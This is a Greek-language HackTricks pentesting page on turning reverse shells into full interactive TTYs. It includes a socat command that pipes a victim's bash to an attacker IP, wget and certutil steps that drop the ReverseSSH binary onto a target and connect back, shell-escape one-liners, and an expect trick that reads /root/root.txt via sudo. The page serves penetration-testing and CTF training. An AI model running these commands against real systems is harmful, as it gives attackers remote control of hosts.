# Πλήρη TTYs

{{#include ../../banners/hacktricks-training.md}}

## Πλήρες TTY

Σημειώστε ότι το shell που ορίζετε στη μεταβλητή `SHELL` **πρέπει** να είναι **καταχωρισμένο μέσα στο** _**/etc/shells**_ ή θα εμφανιστεί το μήνυμα `The value for the SHELL variable was not found in the /etc/shells file This incident has been reported`. Επίσης, σημειώστε ότι τα επόμενα snippets λειτουργούν μόνο στο bash. Αν βρίσκεστε σε zsh, αλλάξτε σε bash πριν αποκτήσετε το shell εκτελώντας `bash`.

#### Python
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
> [!TIP]
> Μπορείτε να λάβετε τον **αριθμό** των **γραμμών** και των **στηλών** εκτελώντας το **`stty -a`**

#### script
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
#### socat
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **Δημιουργία shells**

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `script -qc /bin/bash /dev/null`
- `perl -e 'exec "/bin/sh";'`
- perl: `exec "/bin/sh";`
- ruby: `exec "/bin/sh"`
- lua: `os.execute('/bin/sh')`
- IRB: `exec "/bin/sh"`
- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap: `!sh`

## ReverseSSH

Ένας βολικός τρόπος για **interactive shell access**, καθώς και για **μεταφορές αρχείων** και **port forwarding**, είναι η μεταφορά του statically-linked ssh server [ReverseSSH](https://github.com/Fahrj/reverse-ssh) στο target.<sup>[[1]](#references)</sup>

Παρακάτω υπάρχει ένα παράδειγμα για `x86` με binaries συμπιεσμένα με upx. Για άλλα binaries, δείτε τη [σελίδα releases](https://github.com/Fahrj/reverse-ssh/releases/latest/).

1. Προετοιμαστείτε τοπικά για να αποδεχτείτε το αίτημα ssh port forwarding:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
- (2a) Στόχος Linux:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
- (2b) στόχος Windows 10 (για παλαιότερες εκδόσεις, δείτε το [readme του project](https://github.com/Fahrj/reverse-ssh#features)):
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
- Αν το αίτημα port forwarding του ReverseSSH ήταν επιτυχές, θα πρέπει πλέον να μπορείτε να συνδεθείτε με τον προεπιλεγμένο κωδικό πρόσβασης `letmeinbrudipls` στο context του χρήστη που εκτελεί το `reverse-ssh(.exe)`:
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Penelope

Το [Penelope](https://github.com/brightio/penelope) αναβαθμίζει αυτόματα τα Linux reverse shells σε TTY, διαχειρίζεται το μέγεθος του terminal, καταγράφει τα πάντα και πολλά άλλα. Παρέχει επίσης υποστήριξη readline για Windows shells.<sup>[[2]](#references)</sup>

![penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)

## Χωρίς TTY

Αν για κάποιον λόγο δεν μπορείτε να αποκτήσετε πλήρες TTY, **εξακολουθείτε να μπορείτε να αλληλεπιδράσετε με προγράμματα** που αναμένουν input χρήστη. Στο παρακάτω παράδειγμα, το password περνά στο `sudo` για την ανάγνωση ενός αρχείου:
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
## Αναφορές

- [1] [ReverseSSH - Statically-linked ssh server with reverse shell functionality for CTFs and such](https://github.com/Fahrj/reverse-ssh)
- [2] [Penelope - Shell handler that automates a few things to make life easier](https://github.com/brightio/penelope)

{{#include ../../banners/hacktricks-training.md}}
